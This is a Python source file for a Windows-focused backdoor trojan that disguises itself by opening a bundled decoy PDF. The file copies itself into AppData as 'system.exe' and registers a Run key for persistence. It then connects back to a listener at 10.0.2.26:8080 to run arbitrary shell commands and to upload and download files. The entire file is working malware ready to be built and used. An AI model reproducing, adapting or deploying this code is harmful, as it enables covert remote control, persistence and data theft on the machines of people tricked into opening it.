"""
Backdoor script to be executed on the target to give remote access to the listener.py
"""

import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\system.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v system /t REG_SZ /d "'
                            + file_location + '"', shell=True)

    def execute_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def upload_file(self, path):
        with open(path, "rb") as file:
            ready_file = b""
            while True:
                chunk = file.read(8192)
                ready_file += chunk
                if len(chunk) < 8192:
                    break
        return base64.b64encode(ready_file)

    def download_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return b"[+] Upload successful."

    def change_working_directory_to(self, path):
        os.chdir(path)
        current_directory = os.getcwd()
        return b"[+] Changed working directory to " + current_directory.encode("utf-8") + b"\n"

    def receive_data(self):
        encoded_data = b""
        while True:
            chunk = self.connection.recv(8192)
            encoded_data += chunk
            if len(chunk) < 8192:
                break
        return encoded_data

    def run(self):
        while True:
            json_command = self.receive_data().decode().strip()
            command_received = json.loads(json_command)

            try:
                if command_received[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command_received[0] == "cd" and len(command_received) > 1:
                    command_result = self.change_working_directory_to(command_received[1])
                elif command_received[0] == "download" or command_received[0] == "Download":
                    command_result = self.upload_file(command_received[1])
                elif command_received[0] == "upload":
                    command_result = self.download_file(command_received[1], command_received[2])
                else:
                    command_result = self.execute_command(command_received)
            except Exception as e:
                command_result = b"[-] Backdoor says: Error during command execution \n" + str(e).encode("utf-8")
            json_result = json.dumps(command_result.decode("utf-8", errors="ignore"))
            self.connection.send(json_result.encode("utf-8"))


# Construct the path of the bundled file
file_path = sys._MEIPASS + "\\sample.pdf"

# Open the bundled file using the default application
if sys.platform == "win32":
    os.startfile(file_path)
elif sys.platform == "darwin":
    subprocess.Popen(["open", file_path])
else:
    subprocess.Popen(["xdg-open", file_path])

try:
    my_backdoor = Backdoor("10.0.2.26", 8080)
    my_backdoor.run()
except Exception:
    sys.exit()
